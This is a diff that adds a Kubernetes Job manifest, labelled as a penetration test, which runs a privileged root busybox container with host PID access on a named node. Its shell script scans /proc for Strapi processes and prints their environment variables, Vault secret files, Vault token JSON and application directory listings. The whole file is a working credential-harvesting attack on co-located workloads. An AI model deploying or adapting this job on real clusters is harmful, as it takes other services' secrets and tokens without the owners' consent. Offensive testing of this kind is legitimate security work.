@@ -1,0 +1,53 @@
+apiVersion: batch/v1
+kind: Job
+metadata:
+  name: collect4a
+  namespace: pentest-1148
+  labels:
+    purpose: pentest-1148
+spec:
+  backoffLimit: 0
+  ttlSecondsAfterFinished: 86400
+  template:
+    metadata:
+      labels:
+        purpose: pentest-1148
+    spec:
+      serviceAccountName: probe
+      restartPolicy: Never
+      nodeName: anubis-gateway-chatly-3akkk1
+      hostPID: true
+      containers:
+      - name: c
+        image: busybox:1.36
+        securityContext:
+          privileged: true
+          runAsUser: 0
+        command: ["/bin/sh","-c"]
+        args:
+        - |
+          echo "##HOST $(hostname) uid=$(id -u)"
+          echo "##SCAN"
+          for p in /proc/[0-9]*; do
+            pid=${p#/proc/}
+            cmd=$(tr '\0' ' ' < $p/cmdline 2>/dev/null)
+            [ -z "$cmd" ] && continue
+            case "$cmd" in
+              *strapi*)
+                echo "=====PID=$pid"
+                echo "CMD=$cmd"
+                echo "--ENVIRON--"
+                tr '\0' '\n' < $p/environ 2>&1
+                echo "--VAULTSECDIR--"
+                ls -l $p/root/vault/secrets/ 2>&1
+                echo "--VAULTSECRET--"
+                cat $p/root/vault/secrets/config 2>&1
+                echo "--VAULTTOKEN--"
+                cat $p/root/vault/secrets/*.json 2>&1 | head -5
+                echo "--APPDIR--"
+                ls -l $p/root/app 2>&1 | head -40
+                echo "--END_PID--"
+                ;;
+            esac
+          done
+          echo "##DONE"
